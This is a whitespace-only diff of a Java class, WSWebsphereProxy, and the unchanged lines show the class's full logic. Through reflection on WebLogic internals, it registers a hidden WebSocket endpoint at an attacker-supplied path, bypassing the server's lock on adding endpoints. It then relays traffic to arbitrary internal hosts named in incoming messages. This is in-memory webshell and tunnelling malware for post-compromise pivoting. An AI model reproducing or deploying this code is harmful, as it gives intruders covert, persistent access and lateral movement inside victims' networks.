@@ -26,18 +26,18 @@ public class WSWebsphereProxy extends Endpoint {
     static {
         try {
             Thread threadLocal = Thread.currentThread();
-            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
+            Field workEntry = threadLocal.getClass().getDeclaredField("workEntry");
             workEntry.setAccessible(true);
             weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
-            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
+            Field field1 = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
             field1.setAccessible(true);
             weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
-            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
-            String                                          path              = request.getParameter("path");
-            ServletContext                                  servletContext    = request.getSession().getServletContext();
-            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(WSWebsphereProxy.class, path).build();
-            WsWsocServerContainer                           container         = (WsWsocServerContainer) servletContext.getAttribute("javax.websocket.server.ServerContainer");
-            Field                                           name              = null;
+            ServletRequestImpl request = connectionHandler.getServletRequest();
+            String path = request.getParameter("path");
+            ServletContext servletContext = request.getSession().getServletContext();
+            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(WSWebsphereProxy.class, path).build();
+            WsWsocServerContainer container = (WsWsocServerContainer) servletContext.getAttribute("javax.websocket.server.ServerContainer");
+            Field name = null;
             try {
                 name = container.getClass().getDeclaredField("noMoreAdds");
                 name.setAccessible(true);
@@ -58,13 +58,13 @@ public class WSWebsphereProxy extends Endpoint {
         }
     }
 
-    long                                       i    = 0;
-    ByteArrayOutputStream                      baos = new ByteArrayOutputStream();
-    HashMap<String, AsynchronousSocketChannel> map  = new HashMap<String, AsynchronousSocketChannel>();
+    long i = 0;
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    HashMap<String, AsynchronousSocketChannel> map = new HashMap<String, AsynchronousSocketChannel>();
 
     void readFromServer(Session channel, AsynchronousSocketChannel client) {
         final ByteBuffer buffer = ByteBuffer.allocate(102400);
-        Attach           attach = new Attach();
+        Attach attach = new Attach();
         attach.client = client;
         attach.channel = channel;
         client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
@@ -73,8 +73,8 @@ public class WSWebsphereProxy extends Endpoint {
                 buffer.clear();
                 try {
                     if (buffer.hasRemaining() && result >= 0) {
-                        byte[]     arr = new byte[result];
-                        ByteBuffer b   = buffer.get(arr, 0, result);
+                        byte[] arr = new byte[result];
+                        ByteBuffer b = buffer.get(arr, 0, result);
                         baos.write(arr, 0, result);
                         ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                         if (scAttachment.channel.isOpen()) {
@@ -84,8 +84,8 @@ public class WSWebsphereProxy extends Endpoint {
                         readFromServer(scAttachment.channel, scAttachment.client);
                     } else {
                         if (result > 0) {
-                            byte[]     arr = new byte[result];
-                            ByteBuffer b   = buffer.get(arr, 0, result);
+                            byte[] arr = new byte[result];
+                            ByteBuffer b = buffer.get(arr, 0, result);
                             baos.write(arr, 0, result);
                             readFromServer(scAttachment.channel, scAttachment.client);
                         }
@@ -109,13 +109,13 @@ public class WSWebsphereProxy extends Endpoint {
                 z.flip();
                 z.clear();
             } else if (i == 1) {
-                String                    values      = new String(z.array());
-                String[]                  array       = values.split(" ");
-                String[]                  addrarray   = array[1].split(":");
-                AsynchronousSocketChannel client      = AsynchronousSocketChannel.open();
-                int                       po          = Integer.parseInt(addrarray[1]);
-                InetSocketAddress         hostAddress = new InetSocketAddress(addrarray[0], po);
-                Future<Void>              future      = client.connect(hostAddress);
+                String values = new String(z.array());
+                String[] array = values.split(" ");
+                String[] addrarray = array[1].split(":");
+                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
+                int po = Integer.parseInt(addrarray[1]);
+                InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
+                Future<Void> future = client.connect(hostAddress);
                 try {
                     future.get(10, TimeUnit.SECONDS);
                 } catch (Exception ignored) {
@@ -150,6 +150,6 @@ public class WSWebsphereProxy extends Endpoint {
 
     static class Attach {
         public AsynchronousSocketChannel client;
-        public Session                   channel;
+        public Session channel;
     }
 }
